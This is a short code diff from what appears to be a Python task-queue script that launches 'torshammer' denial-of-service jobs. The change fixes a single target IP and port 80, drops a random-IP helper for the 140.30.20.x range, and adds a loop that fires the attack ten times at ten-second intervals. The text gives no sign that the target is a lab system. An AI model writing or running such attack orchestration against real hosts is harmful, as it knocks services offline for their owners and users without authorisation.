@@ -28,19 +28,18 @@ import random
 def start_attack():
     global r
     r = ResultSet([])
+    a= True
     
-    ips=["140.30.20.5"]
+    ip=["140.30.20.5"]
     #ips = randomize_ip()
     #ports = [80, 443, 8080]
-    ports= [80]
-    for port in ports:
-        r.add(torshammer.delay(ips, port))
+    port = 80
 
-def randomize_ip():
-	randIP = random.randrange(5,205)
-	ip = "140.30.20." + str(randIP)
-	print("IP: " + ip)
-	return ip
+    for i in range(10):
+        ataque = torshammer.delay(ip, port) 
+        r.add(ataque)
+        time.sleep(10)
+        
     
 def end_attacks():
     global r
